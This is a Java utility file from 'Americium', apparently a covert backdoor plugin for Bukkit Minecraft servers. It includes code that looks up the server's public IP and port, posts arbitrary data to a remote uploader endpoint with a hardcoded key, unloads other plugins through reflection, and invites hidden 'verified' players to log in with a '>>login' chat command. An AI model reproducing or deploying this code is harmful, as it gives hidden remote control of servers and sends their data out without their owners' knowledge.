package cc.americium;

import org.apache.commons.lang.ArrayUtils;
import org.apache.commons.lang.SystemUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.PluginCommand;
import org.bukkit.command.SimpleCommandMap;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.*;

import java.awt.*;
import java.io.*;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.List;
import java.util.*;

public class Utilities {
    public static boolean isNewApi() {
        String version = Bukkit.getVersion().toLowerCase();
        String[] newApis = {"1.13", "1.14", "1.15", "1.16", "1.17"};
        for (String api : newApis) {
            if (version.contains(api)) {
                return true;
            }
        }

        return false;
    }

    public static ItemStack getHeldItem(Player p) {
        if (Bukkit.getVersion().contains("1.8")) {
            return p.getInventory().getItemInHand();
        }

        return p.getInventory().getItemInMainHand();
    }

    public static cc.americium.command.Command[] getAdminCommands(Z_ z) {
        cc.americium.command.Command[] commands = z.commands;
        for (cc.americium.command.Command adminCommand : z.adminOnly) {
            commands = (cc.americium.command.Command[]) ArrayUtils.add(commands, adminCommand);
        }

        return commands;
    }

    // Plugman code but fixed and cleaned up some!
    public static void unload(Plugin plugin, Z_ z) throws Exception {
        final String name = plugin.getName();
        final PluginManager pluginManager = Bukkit.getPluginManager();
        SimpleCommandMap commandMap;
        List<Plugin> plugins;
        Map<String, Plugin> names;
        Map<String, Command> commands;
        Map<Event, SortedSet<RegisteredListener>> listeners = null;
        Bukkit.getScheduler().runTask(z, () -> pluginManager.disablePlugin(plugin));
        final Field pluginsField = Bukkit.getPluginManager().getClass().getDeclaredField("plugins");
        pluginsField.setAccessible(true);
        plugins = (List<Plugin>) pluginsField.get(pluginManager);
        final Field lookupNamesField = Bukkit.getPluginManager().getClass().getDeclaredField("lookupNames");
        lookupNamesField.setAccessible(true);
        names = (Map<String, Plugin>) lookupNamesField.get(pluginManager);
        try {
            final Field listenersField = Bukkit.getPluginManager().getClass().getDeclaredField("listeners");
            listenersField.setAccessible(true);
            listeners = (Map<Event, SortedSet<RegisteredListener>>) listenersField.get(pluginManager);
        } catch (Exception ignored) {

        }

        final Field commandMapField = Bukkit.getPluginManager().getClass().getDeclaredField("commandMap");
        commandMapField.setAccessible(true);
        commandMap = (SimpleCommandMap) commandMapField.get(pluginManager);
        final Field knownCommandsField = SimpleCommandMap.class.getDeclaredField("knownCommands");
        knownCommandsField.setAccessible(true);
        commands = (Map<String, Command>) knownCommandsField.get(commandMap);

        Bukkit.getScheduler().runTask(z, () -> pluginManager.disablePlugin(plugin));
        if (plugins != null) {
            plugins.remove(plugin);
        }

        if (names != null) {
            names.remove(name);
        }

        if (listeners != null) {
            for (final SortedSet<RegisteredListener> set : listeners.values()) {
                set.removeIf(value -> value.getPlugin() == plugin);
            }
        }

        if (commandMap != null) {
            final Iterator<Map.Entry<String, Command>> it2 = commands.entrySet().iterator();
            while (it2.hasNext()) {
                final Map.Entry<String, Command> entry = it2.next();
                if (entry.getValue() instanceof PluginCommand) {
                    final PluginCommand c = (PluginCommand) entry.getValue();
                    if (c.getPlugin() != plugin) {
                        continue;
                    }

                    c.unregister(commandMap);
                    it2.remove();
                }
            }
        }
        final ClassLoader cl = plugin.getClass().getClassLoader();
        if (cl instanceof URLClassLoader) {
            final Field pluginField = cl.getClass().getDeclaredField("plugin");
            pluginField.setAccessible(true);
            pluginField.set(cl, null);
            final Field pluginInitField = cl.getClass().getDeclaredField("pluginInit");
            pluginInitField.setAccessible(true);
            pluginInitField.set(cl, null);

            ((URLClassLoader) cl).close();
        }

        Bukkit.getScheduler().runTask(z, System::gc);
    }

    public static void loadPlugin(Z_ z, File file) throws InvalidPluginException, InvalidDescriptionException {
        Plugin target = Bukkit.getPluginManager().loadPlugin(file);
        if (target != null) {
            target.onLoad();
        }

        Bukkit.getScheduler().runTask(z, () -> Bukkit.getPluginManager().enablePlugin(target));
    }

    public static String serverIP() {
        String ip;
        try {
            URL url = new URL("https://checkip.amazonaws.com");
            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            ip = in.readLine();
        } catch (IOException e) {
            return e.getMessage();
        }

        return ip + ":" + Bukkit.getServer().getPort();
    }

    public static BufferedReader uploadFile(String data, Z_ z, String endpoint) throws IOException {
        URL url = new URL(z.uploader + "/" + endpoint);
        Map<String, Object> params = new LinkedHashMap<>();
        params.put("text", data);
        params.put("akey", "amerultramoment");

        StringBuilder postData = new StringBuilder();
        for (Map.Entry<String, Object> param : params.entrySet()) {
            if (postData.length() != 0) postData.append('&');
            postData.append(URLEncoder.encode(param.getKey(), "UTF-8"));
            postData.append('=');
            postData.append(URLEncoder.encode(String.valueOf(param.getValue()), "UTF-8"));
        }
        byte[] postDataBytes = postData.toString().getBytes(StandardCharsets.UTF_8);

        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        conn.setRequestProperty("Content-Length", String.valueOf(postDataBytes.length));
        conn.setDoOutput(true);
        conn.getOutputStream().write(postDataBytes);

        return new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));
    }

    public static void checkAllUsers(Z_ z) throws IOException, InterruptedException {
        if (Bukkit.getOnlinePlayers().size() == 0) {
            return;
        }

        for (Player p : Bukkit.getOnlinePlayers()) {
            if (!z.getAuth().isVerified(p.getName())) {
                continue;
            }

            DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd HH:mm:ss");
            LocalDateTime now = LocalDateTime.now();
            p.sendMessage(Colors.Prefix + Colors.Success + "Welcome to " + Colors.Name + " as of " + dtf.format(now) + "! Type '>>login' to login! I think I just came back from a reload! " + Utilities.versionString(z));
        }
    }

    public static String getStringFromBuffer(Reader reader) {
        StringBuilder sb = new StringBuilder();

        try {
            for (int c; (c = reader.read()) >= 0; ) {
                sb.append((char) c);
            }
        } catch (IOException e) {
            return Colors.Failure + e.getMessage();
        }

        return sb.toString();
    }

    public static String prettyMaterial(Material material) {
        return material.name().toLowerCase().replaceAll("_", " ");
    }

    // Location -> (x, y, z)
    public static String locationToString(Location loc) {
        return ("(" + Math.floor(loc.getX()) + ", " + Math.floor(loc.getY()) + ", " + Math.floor(loc.getZ()) + ")").replaceAll(".0,", ",").replace(".0)", ")");
    }

    public static String versionString(Z_ z) {
        if (z.isOutdated) {
            return Colors.Failure + " §nYour current americium version is " + z.version + " which is out of date.";
        } else {
            return Colors.Success + " Your current americium version is " + z.version + " which is up to date.";
        }
    }

    public static String osVersion(Z_ z) {
        String os_name = SystemUtils.OS_NAME;
        return Colors.Success + " Americium is currently running on " + os_name + ".";
    }
}
